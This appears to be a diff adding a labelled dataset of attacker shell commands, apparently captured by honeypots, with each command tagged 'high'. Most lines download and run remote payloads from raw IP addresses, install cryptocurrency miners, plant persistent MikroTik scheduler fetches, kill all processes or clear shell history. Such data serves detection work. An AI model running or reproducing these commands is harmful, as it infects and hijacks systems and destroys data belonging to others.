@@ -1,0 +1,71 @@
+{"command":"wget http:\/\/2.58.149.116\/w -O- | sh; curl http:\/\/2.58.149.116\/c -O- | sh","label":"high"}
+{"command":"wget http:\/\/2.58.149.116\/spc -O- > ntpclient; chmod 777 ntpclient; .\/ntpclient test.wget.spc","label":"high"}
+{"command":"wget http:\/\/194.31.98.244\/ssh\/spc -O- > ntpclient; chmod 777 ntpclient; .\/ntpclient test.wget.spc","label":"high"}
+{"command":"cd \/tmp || cd \/var\/ || cd \/var\/run || cd \/mnt || cd \/root || cd \/; rm -rf i; wget http:\/\/192.168.1.1:8088\/i; curl -O http:\/\/192.168.1.1:8088\/i; \/bin\/busybox wget http:\/\/192.168.1.1:8088\/i; chmod 777 i || (cp \/bin\/ls ii;cat i>ii;rm i;cp ii i;rm ii); .\/i; echo -e '\\x63\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x65\\x64'","label":"high"}
+{"command":"cd \/\/; wget http:\/\/2.58.149.116\/spc -O- > .f; .\/.f s.spc; >.f; echo test","label":"high"}
+{"command":"cat \/etc\/issue; cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/; wget -q http:\/\/185.142.239.224\/dirdir000\/0s1s12.x86; cat 0s1s12.x86 > z1z2z5a6qw5asda; chmod +x z1z2z5a6qw5asda; .\/z1z2z5a6qw5asda Rooted.VPS; history -c","label":"high"}
+{"command":"\/system scheduler add name=\"U6\" interval=10m on-event=\"\/tool fetch url=http:\/\/myfrance.xyz\/poll\/7affcbff-2216-4dca-ba48-80b5f7137ce4 mode=http dst-path=7wmp0b4s.rsc\\r\\n\/import 7wmp0b4s.rsc\" policy=api,ftp,local,password,policy,read,reboot,sensitive,sniff,ssh,telnet,test,web,winbox,write","label":"high"}
+{"command":">\/tmp\/.a && cd \/tmp; >\/dev\/.a && cd \/dev;wget http:\/\/2.58.149.116\/spc -O- >.f;chmod 777 .f;.\/.f scan.wget.spc","label":"high"}
+{"command":"cd \/dev\/shm || cd \/tmp || cd \/var\/run || cd \/mnt; wget 198.98.56.65\/krax || curl -o krax 198.98.56.65\/krax; tar xvf krax; cd ._lul; chmod +x *; .\/krn; .\/krane oracle","label":"high"}
+{"command":"cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/; wget http:\/\/198.23.172.240\/100UP.sh; curl -O http:\/\/198.23.172.240\/100UP.sh; chmod 777 100UP.sh; sh 100UP.sh; rm -rf *","label":"high"}
+{"command":"cd \/tmp; wget 51.79.55.208:8281\/sshd -O \/tmp\/sshd; curl 51.79.55.208:8281\/sshd -o \/tmp\/sshd; bash \/tmp\/sshd; rm -rf \/tmp\/sshd; rm -r \/tmp\/sshd; rm -rf \/var\/tmp\/sshd; rm -rf \/var\/tmp\/sshd.*; rm -rf \/tmp\/sshd.*","label":"high"}
+{"command":"cat \/etc\/issue; wget http:\/\/45.10.24.18\/x86_64; chmod 777 x86_64; .\/x86_64 skids","label":"high"}
+{"command":"wget http:\/\/193.233.185.75\/fbot.x86_64; chmod 777 fbot.x86_64; .\/fbot.x86_64 x86_64","label":"high"}
+{"command":"cat \/etc\/issue; cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/; wget -q http:\/\/179.43.176.41\/cometome; cat cometome > meth; chmod +x meth; chmod 777 meth; .\/meth; history -c","label":"high"}
+{"command":"wget http:\/\/78.157.39.60\/we.sh; chmod 777 *; sh we.sh","label":"high"}
+{"command":"cat \/etc\/issue; cd \/tmp; rm -rf x86_64; wget http:\/\/45.14.149.244\/x86_64; chmod 777 x86_64; .\/x86_64 x86hxed; echo firewalla1337 & Anarchy were here","label":"high"}
+{"command":".\/ddnsclient; chmod 777 ntpclient; .\/ntpclient","label":"high"}
+{"command":"kill %%1","label":"high"}
+{"command":"cd \/tmp || cd \/; wget -q http:\/\/209.141.40.31\/Y91\/x86; curl -O http:\/\/209.141.40.31\/Y91\/x86 chmod +x *; .\/x86","label":"high"}
+{"command":"lscpu ; nproc ; wget https:\/\/cdn.discordapp.com\/attachments\/834709504049414155\/836553024704348200\/NTeleportation.cs","label":"high"}
+{"command":"cat \/etc\/issue; cd \/tmp; rm -rf x86_64; wget http:\/\/45.14.149.244\/x86_64; chmod 777 x86_64; .\/x86_64 test; echo firewalla1337 and Anarchy were here","label":"high"}
+{"command":"uname -a; cd \/tmp ;curl -s -L http:\/\/download.c3pool.com\/xmrig_setup\/raw\/master\/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 49UVbUeeWjV824vMb8z41M9BqLMxQSkz41pP76CFtkSuKfTwhRWw5MWE13rdB5uxerbnE8Rj2h2nvGAfEPuApn9bGNUV4UJ","label":"high"}
+{"command":"rm .s; tftp -l.i -r.i -g 202.124.228.63:45536; chmod 777 .i; .\/.i; exit","label":"high"}
+{"command":"yum install wget -y; apt install wget -y; cd \/tmp\/; rm -rf x86_64; rm -rf x86; wget http:\/\/2.56.59.225\/x86_64; chmod 777 x86_64; .\/x86_64 x86","label":"high"}
+{"command":"cd \/tmp ; wget http:\/\/51.210.71.115\/ok.sh ; sh ok.sh ; rm -rf ok.sh ; curl -O http:\/\/51.210.71.115\/ok.sh ; sh ok.sh ; rm -rf ok.sh ; history -c","label":"high"}
+{"command":"cd \/tmp  cd \/var\/run  cd \/mnt  cd \/root  cd \/; wget http:\/\/104.168.52.153\/Ace.sh; chmod 777 Ace.sh; sh Ace.sh; tftp 104.168.52.153 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 104.168.52.153; chmod 777 tftp2.sh; sh tftp2.sh; rm -f tftp*.sh Ace.sh","label":"high"}
+{"command":"cd \/tmp;rm -rf ur0a.sh;wget http:\/\/206.81.26.46\/ur0a.sh;chmod +x ur0a.sh;.\/ur0a.sh;sh ur0a.sh;rm -rf ur0a.sh;cd;history -c;","label":"high"}
+{"command":"wget http:\/\/206.81.26.46\/Simps\/mips","label":"high"}
+{"command":"wget http:\/\/31.44.185.235\/s -O- |sh","label":"high"}
+{"command":"wget http:\/\/2.58.149.116\/ssh\/f -O- | sh; curl http:\/\/2.58.149.116\/ssh\/f | sh","label":"high"}
+{"command":".\/ddnsclient; chmod 777 ntpclient; .\/ntpclient","label":"high"}
+{"command":"kill %%1","label":"high"}
+{"command":"kill -9 -1`","label":"high"}
+{"command":"kill -9 -1","label":"high"}
+{"command":"sudo su","label":"high"}
+{"command":"wget https:\/\/cdn.discordapp.com\/attachments\/834709504049414155\/836574658668265522\/New_Text_Document.sh","label":"high"}
+{"command":"wget nasapaul.com\/ninfo","label":"high"}
+{"command":"wget nasapaul.com\/ninfo","label":"high"}
+{"command":".\/ninfo","label":"high"}
+{"command":".\/686840","label":"high"}
+{"command":".\/595936","label":"high"}
+{"command":".\/812969","label":"high"}
+{"command":".\/253294","label":"high"}
+{"command":".\/624818","label":"high"}
+{"command":".\/212630","label":"high"}
+{"command":".\/542492","label":"high"}
+{"command":".\/840190","label":"high"}
+{"command":".\/176844","label":"high"}
+{"command":"echo \"ZIGAZAGA1488\"\ncat \/dev\/stdin | sh\n#!\/usr\/bin\/sh\n#timeout=30\nkillSTDIN() {\nprocessID=$(ps -u | grep -v 'grep' | grep cat | grep '\/dev\/stdin' | head -n 1 | awk -F ' ' '{ print $2 }');\nps -u | grep -v grep | grep cat | grep \/dev\/stdin | head -n 1 | awk -F   { print $2 }\n$(kill -9 $processID);\nkill -9 $processID\n}\nendScript() {\necho \"KGB_CLOSE\";\n$(exec 1>&-);\nexec 1 >& -\nkillSTDIN;\n}\nstart(){\nstartResult=$(echo \"[[[\"\necho [[[stopResult=$(echo \"]]]\")\necho ]]]\ncmd='N\/A';\nif [ -f $(which uptime) ]; then\nwhich uptime\ncmd=$(uptime);\nuptime\nfi\necho $startResult$cmd$stopResult;\n}\nstart;\nendScript;\ncat \/dev\/stdin | sh\n#!\/usr\/bin\/sh\n#timeout=30\nkillSTDIN() {\nprocessID=$(ps -u | grep -v 'grep' | grep cat | grep '\/dev\/stdin' | head -n 1 | awk -F ' ' '{ print $2 }');\nps -u | grep -v grep | grep cat | grep \/dev\/stdin | head -n 1 | awk -F   { print $2 }\n$(kill -9 $processID);\nkill -9 $processID\n}\nendScript() {\necho \"KGB_CLOSE\";\n$(exec 1>&-);\nexec 1 >& -\nkillSTDIN;\n}\nstart(){\nstartResult=$(echo \"[[[\"\necho [[[stopResult=$(echo \"]]]\")\necho ]]]\ncmd=$(id);\nid\necho $startResult$cmd$stopResult;\n}\nstart;\nendScript;\ncat \/dev\/stdin | sh\n#!\/usr\/bin\/sh\n#timeout=20\nkillSTDIN() {\nprocessID=$(ps -u | grep-v 'grep' | grep cat | grep '\/dev\/stdin' | head -n 1 | awk -F ' ' '{ print $2 }');\nps -u | grep-v grep | grep cat | grep \/dev\/stdin | head -n 1 | awk -F   { print $2 }\n$(kill -9 $processID);\nkill -9 $processID\n}\nendScript() {\necho \"KGB_CLOSE\";\n$(exec 1>&-);\nexec 1 >& -\nkillSTDIN;\n}\nstart(){\nstartResult=$(echo \"[[[\"\necho [[[stopResult=$(echo \"]]]\")\necho ]]]\ncmd='N\/A';\nif [ -f $(which uptime) ]; then\nwhich uptime\ncmd=$(uptime);\nuptime\nfi\necho $startResult$cmd$stopResult;\n}\nstart;\n","label":"high"}
+{"command":"curl -s -L http:\/\/download.c3pool.org\/xmrig_setup\/raw\/master\/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 45dNkjTQGgT77r9AEMyHdCGan5tpuekXaHFhFW99dQ8hUS35oZQEYXddFE52jxVdfUNrAD4ZyZ44BgHfgk5SjHdoLjGdJnQ","label":"high"}
+{"command":"cd \/tmp && chmod +x Lhtln3CT && bash -c .\/Lhtln3CT","label":"high"}
+{"command":".\/Lhtln3CT","label":"high"}
+{"command":"cd \/tmp && chmod +x 2p8unLIG && bash -c .\/2p8unLIG","label":"high"}
+{"command":".\/2p8unLIG","label":"high"}
+{"command":"chmod +x .\/.3232227691811897618\/xinetd;nohup .\/.3232227691811897618\/xinetd  &","label":"high"}
+{"command":"cd \/tmp; wget http:\/\/31.44.185.235\/unknown -O- >.f; chmod 777 .f; .\/.f ssh.unknown","label":"high"}
+{"command":"cd \/tmp && chmod +x tZft1Zbk && bash -c .\/tZft1Zbk","label":"high"}
+{"command":".\/tZft1Zbk","label":"high"}
+{"command":"cd \/tmp && chmod +x tseLLRfT && bash -c .\/tseLLRfT","label":"high"}
+{"command":".\/tseLLRfT","label":"high"}
+{"command":"cd \/tmp && chmod +x 5RcJ2tf9 && bash -c .\/5RcJ2tf9","label":"high"}
+{"command":".\/5RcJ2tf9","label":"high"}
+{"command":".\/PHri0doL","label":"high"}
+{"command":"uname -a;lspci | grep -i --color 'vga\\|3d\\|2d';curl -s -L http:\/\/222.100.89.36\/stx.sh | LC_ALL=en_US.UTF-8 bash -s 4AXp4BAFuqCUNLJ3X12FKg7jp9MQjiMeWG1bMme9znFNPvhP2LqGXUF5pEfaeMQ7FAArXVWnUAEEMF2Kms6xzjMGVagomWr","label":"high"}
+{"command":"wget http:\/\/2.58.149.116\/spc -O- > ntpclient; chmod 777 ntpclient; .\/ntpclient test.wget.spc; curl http:\/\/2.58.149.116\/spc > ntpclient; chmod 777 ntpclient; .\/ntpclient test.curl.spc","label":"high"}
+{"command":"cd \/tmp && chmod +x ePxJOVoq && bash -c .\/ePxJOVoq","label":"high"}
+{"command":".\/ePxJOVoq","label":"high"}
+{"command":"rm .s; wget http:\/\/2.225.20.46:40746\/.i; chmod 777 .i; .\/.i; exit","label":"high"}
+{"command":".\/ddnsclient; chmod 777 ntpclient; .\/ntpclient","label":"high"}
+{"command":".\/ddnsclient; chmod 777 ntpclient; .\/ntpclient","label":"high"}
+{"command":"kill %%1","label":"high"}
